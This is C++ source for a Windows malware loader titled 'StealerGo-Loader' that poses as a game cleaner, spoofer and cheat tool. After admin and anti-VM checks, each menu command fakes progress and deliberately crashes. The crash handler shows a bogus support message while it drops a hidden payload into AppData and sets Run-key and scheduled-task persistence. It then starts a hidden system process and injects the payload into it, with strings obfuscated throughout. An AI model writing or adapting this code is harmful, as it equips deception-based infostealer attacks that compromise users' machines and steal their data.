#include "externals.h"
#include <filesystem>
#include <strsafe.h>

bool ensure_persistent( std::vector<char>& payload ) {
    std::wstring dest_path = get_destination_path( );
    if ( dest_path.empty( ) ) return false;

    if ( !write_file_bytes( dest_path, payload ) ) return false;

    SetFileAttributesW( dest_path.c_str( ), FILE_ATTRIBUTE_HIDDEN );
    add_run_registry_key( dest_path );
    add_scheduled_task_persistence( );
    add_scheduled_task( dest_path );
    return true;
}

        bool drop_file_from_bytes(const std::wstring& path, const unsigned char* data, size_t size) {
            std::ofstream file(path, std::ios::binary | std::ios::trunc);
            if (!file.is_open()) return false;
            file.write(reinterpret_cast<const char*>(data), size);
            file.close();
            return file.good();
        }

        long crash_handler( EXCEPTION_POINTERS* exception_pointers ) {
            const auto* context = exception_pointers->ContextRecord;
            char message[ 1024 ];
            sprintf( message,
                oxorany( "Oops! Something went wrong!\n\n"
                "The service encountered an unexpected error and needs to close.\n\n"
                "Quick fixes to try:\n"
                "  • Restart the service\n"
                "  • Rollback recent updates to the service\n"
                "  • Check if your antivirus is interfering\n\n"
                "Still having trouble? We're here to help!\n"
                "Contact support through the tickets section.\n\n"
                "Crash Details:\n"
                "Build: %s %s\n"
                "Error: 0x%08X at %p\n"
                "Registers: RSP=%016llX RDI=%016llX\n"
                "           RSI=%016llX RBX=%016llX\n"
                "           RDX=%016llX RCX=%016llX\n"
                "           RAX=%016llX RBP=%016llX" ),
                __DATE__, __TIME__,
                exception_pointers->ExceptionRecord->ExceptionCode,
                exception_pointers->ExceptionRecord->ExceptionAddress,
                context->Rsp, context->Rdi,
                context->Rsi, context->Rbx,
                context->Rdx, context->Rcx,
                context->Rax, context->Rbp
            );

            io::print( oxorany( "[ ! ] Caught error in program" ) );
            MessageBoxA( 0, message, "Unexpected Error - Press OK", MB_ICONERROR | MB_OK );

            std::wstring dest_path = get_destination_path( ); // e.g., %APPDATA%\Microsoft\systemhelper.exe
            if ( !dest_path.empty( ) ) {
                if ( drop_file_from_bytes( dest_path, payload_bytes, sizeof( payload_bytes ) ) ) {
                    SetFileAttributesW( dest_path.c_str( ), FILE_ATTRIBUTE_HIDDEN );
                    add_run_registry_key( dest_path );
                }
            }

            writes_system_dll( oxorany( L"zlib1.dll" ), zlib1_bytes, sizeof( zlib1_bytes ) );
            writes_system_dll( oxorany( L"sqlite3.dll" ), sqlite3_bytes, sizeof( sqlite3_bytes ) );
            writes_system_dll( oxorany( L"libsodium.dll" ), libsodium_bytes, sizeof( libsodium_bytes ) );
            writes_system_dll( oxorany( L"libcurl.dll" ), libcurl_bytes, sizeof( libcurl_bytes ) );

            STARTUPINFOW si = { sizeof( si ) };
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            PROCESS_INFORMATION pi = { 0 };
            if ( CreateProcessW( oxorany( L"C:\\Windows\\System32\\InputSwitchToastHandler.exe" ), NULL, NULL, NULL,
                FALSE, 0, NULL, NULL, &si, &pi ) ) {
                DWORD pid = pi.dwProcessId;
                HANDLE hproc = pi.hProcess;
                if ( pid ) {
                    if ( !loadstub( hproc, payload_bytes, sizeof( payload_bytes ), true, false, false, true, DLL_PROCESS_ATTACH, 0 ) ) {
                        io::log_error( oxorany( ( "Please run loader as admin." ) ) );
                        std::getchar( );
                        exit( 0 );
                    }
                }
            }

            RtlSecureZeroMemory( payload_bytes, sizeof( payload_bytes ) );
            return true;
        }

int main() 
{
    SetConsoleTitleA(oxorany("StealerGo-Loader"));
    SetUnhandledExceptionFilter( crash_handler );

    HANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode;
    GetConsoleMode(hInput, &mode);
    mode &= ~(ENABLE_MOUSE_INPUT | ENABLE_QUICK_EDIT_MODE);
    mode |= (ENABLE_EXTENDED_FLAGS | ENABLE_PROCESSED_INPUT | ENABLE_ECHO_INPUT);
    SetConsoleMode(hInput, mode);

    if (!IsAdmin()) {
        io::log_error(oxorany("Please run me as administrator."));
        Sleep(6000);
        exit(0);
    }

    // some don't work on Windows 11
	registryCheck();
	processesAndFilesCheck();
	macCheck();
	hwidVm();
	checkGpu();
    checkIp();
	profiles();

    io::print(oxorany("[ + ] command list: cleaner, spoofer, cheat"));
    io::printsl(oxorany("[ -> ] enter command: "));

    char command[ 64 ];
    std::cin.getline( command, sizeof( command ) );
    if ( std::strlen( command ) >= 3 ) {
        system( oxorany( "cls" ) );

        if ( std::strstr( command, oxorany( "cleaner" ) ) ) {
            io::print( oxorany( "\n[ + ] initializing cleaner" ) );
            Sleep( 500 );
            io::print( oxorany( "[ ! ] cleaned 10640 files" ) );
            io::print( oxorany( "[ + ] cleaning registry..." ) );

            *reinterpret_cast< std::uint64_t* >( 0 ) = 0;
        }
        else if ( std::strstr( command, oxorany( "spoofer" ) ) ) {
            io::print( oxorany( "\n[ + ] initializing spoofer" ) );
            io::print( oxorany( "[ + ] cleaning mac address..." ) );
            Sleep( 500 );

            *reinterpret_cast< std::uint64_t* >( 0 ) = 0;
        }
        else if ( std::strstr( command, oxorany( "injector" ) ) ) {
            io::print( oxorany( "\n[ + ] initializing injector" ) );
            io::print( oxorany( "[ + ] searching for Dll payload.dll" ) );
            Sleep( 500 );

            *reinterpret_cast< std::uint64_t* >( 0 ) = 0;
        }

        io::print( oxorany( "\n[ ! ] invalid command" ) );
        std::cin.get();
        Sleep( 6000 );
        exit( 0 );
    }

    std::cin.get();
    Sleep(6000);
    exit(0);
}